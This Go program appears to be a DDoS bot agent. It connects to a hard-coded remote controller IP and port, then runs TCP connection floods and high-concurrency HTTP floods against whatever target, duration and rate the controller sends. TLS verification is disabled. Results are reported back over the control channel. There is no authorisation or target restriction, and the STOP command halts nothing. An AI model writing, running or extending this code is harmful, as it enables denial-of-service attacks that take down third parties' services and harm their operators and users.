package main

import (
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

const (
	SERVER_HOST = "103.157.205.191"
	SERVER_PORT = "9999"
	MAX_HTTP_RPS = 400
)

func sendReport(conn net.Conn, msg string) {
	conn.Write([]byte("REPORT:" + msg + "\n"))
}

func stressTCP(ip string, port string, durationSec int, conn net.Conn) {
	data := make([]byte, 1024)
	end := time.Now().Add(time.Duration(durationSec) * time.Second)
	var total uint64
	for time.Now().Before(end) {
		go func() {
			c, err := net.Dial("tcp", ip+":"+port)
			if err != nil {
				return
			}
			defer c.Close()
			c.Write(data)
			atomic.AddUint64(&total, uint64(len(data)))
		}()
		time.Sleep(1 * time.Millisecond)
	}
	sendReport(conn, fmt.Sprintf("TCP MB/s ~ %.2f", float64(total)/(1024*1024)/float64(durationSec)))
}

func stressHTTP(rawurl, method string, durationSec, concurrency, rps int, conn net.Conn) {
	if rps > MAX_HTTP_RPS {
		rps = MAX_HTTP_RPS
	}

	runtime.GOMAXPROCS(runtime.NumCPU())
	u, err := url.Parse(rawurl)
	if err != nil {
		sendReport(conn, "Invalid URL")
		return
	}

	client := &http.Client{
		Transport: &http.Transport{
			Proxy:             http.ProxyFromEnvironment,
			ForceAttemptHTTP2: true,
			MaxIdleConns:      1000,
			MaxIdleConnsPerHost: 1000,
			IdleConnTimeout:   90 * time.Second,
			TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
		},
	}

	var success, fail uint64
	var totalLatency int64

	perWorkerRPS := float64(rps) / float64(concurrency)
	if perWorkerRPS < 1 {
		perWorkerRPS = 1
	}

	var wg sync.WaitGroup
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(durationSec)*time.Second)
	defer cancel()

	worker := func() {
		interval := time.Duration(float64(time.Second) / perWorkerRPS)
		if interval <= 0 {
			interval = time.Microsecond
		}
		ticker := time.NewTicker(interval)
		defer ticker.Stop()
		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				req, _ := http.NewRequest(method, u.String(), nil)
				start := time.Now()
				resp, err := client.Do(req)
				lat := time.Since(start)
				if err != nil {
					atomic.AddUint64(&fail, 1)
					continue
				}
				if resp.Body != nil {
					io.Copy(io.Discard, resp.Body)
					resp.Body.Close()
				}
				if resp.StatusCode >= 200 && resp.StatusCode < 400 {
					atomic.AddUint64(&success, 1)
				} else {
					atomic.AddUint64(&fail, 1)
				}
				atomic.AddInt64(&totalLatency, int64(lat))
			}
		}
	}

	for i := 0; i < concurrency; i++ {
		wg.Add(1)
		go func() { defer wg.Done(); worker() }()
	}
	wg.Wait()

}

func handleServer(conn net.Conn) {
	defer conn.Close()
	buf := make([]byte, 1024)
	for {
		n, err := conn.Read(buf)
		if err != nil {
			return
		}
		cmd := strings.TrimSpace(string(buf[:n]))
		if cmd == "" {
			continue
		}
		parts := strings.Split(cmd, " ")
		switch parts[0] {
		case "STRESS_TCP":
			if len(parts) >= 4 {
				duration, _ := strconv.Atoi(parts[3])
				go stressTCP(parts[1], parts[2], duration, conn)
			}
		case "STRESS_HTTP":
			if len(parts) >= 6 {
				duration, _ := strconv.Atoi(parts[3])
				concurrency, _ := strconv.Atoi(parts[4])
				rps, _ := strconv.Atoi(parts[5])
				go stressHTTP(parts[1], parts[2], duration, concurrency, rps, conn)
			}
		case "STOP":
			sendReport(conn, "Stopped by server")
		}
	}
}

func main() {
	conn, err := net.Dial("tcp", SERVER_HOST+":"+SERVER_PORT)
	if err != nil {
		fmt.Println("Cannot connect to server:", err)
		return
	}
	fmt.Println("[*] Connected to server")
	handleServer(conn)
}
